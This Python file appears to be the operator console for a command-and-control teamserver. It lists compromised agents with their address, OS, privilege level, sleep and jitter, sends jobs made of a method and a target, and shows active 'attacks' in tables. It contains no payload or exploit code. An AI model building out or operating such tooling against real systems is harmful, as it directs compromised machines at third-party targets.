import sys
import datetime

from stone_color import tables
from stone_color import processbar
from stone_color.messages import *

from teamserver import CError, TeamServer

global ts
ts: TeamServer = TeamServer.__empty__() 

class Agent:
    def __init__(
        self,
        uuid: str,
        addr: str,
        os: str,
        elevated: bool,
        sleep: float,
        jitter: float,
        last_ping: float,
        ) -> None:
        self.uuid       = uuid
        self.addr       = addr
        self.os         = os
        self.elevated   = bool(elevated)
        self.sleep      = sleep
        self.jitter     = jitter
        self.last_ping  = int(datetime.datetime.today().timestamp() - float(last_ping))
    
    def get_values(self) -> list[str]:
        return list(map(str, [self.uuid, self.addr, self.os, self.elevated, formatf(self.sleep, "s", sep=""), formatf(self.jitter, "%", sep=""), formatf(self.last_ping, "s", sep="")]))

    def get_keys() -> list:
        return ["UUID", "Addr", "OS", "Elevated", "Sleep", "Jitter", "Last ping"]

def init(_ts: TeamServer):
    global ts
    ts = _ts

def add_job(*args):
    if len(args) <= 2:
        printf("{} <method> <target>".format(args[0]))
        return 

    method = args[1]
    target = args[2]

    data = ts.send_job(method, target)
    if isinstance(data, CError):
        errorf(data)

#  TODO: get methods and show it
def methods(*_):
    ...


def jobs(*_):
    js = ts.get_jobs()
    if isinstance(js, CError):
        errorf(js)
    elif len(js) <= 0:
        errorf("No active jobs found")
    else:
        headers = list(map(str.capitalize, list(js[0].keys())))
        data = []
        for attack in js:
            data.append(list(attack.values()))
        
        printf("\n", tables.ascii_table(headers, data), sep="")

def listagents(*_):
    agents = ts.get_agents()
    if isinstance(agents, CError):
        errorf(agents)
    elif len(agents) <= 0:
        errorf("No active agents found")
    else:
        headers = list(Agent.get_keys())
        data = []
        for agent in agents:
            agent = Agent(*agent.values())
            data.append(
                agent.get_values()
            )
        
        printf("\n", tables.ascii_table(headers, data), sep="")

def quit(*_):
    ts.close()
    sys.exit(0)
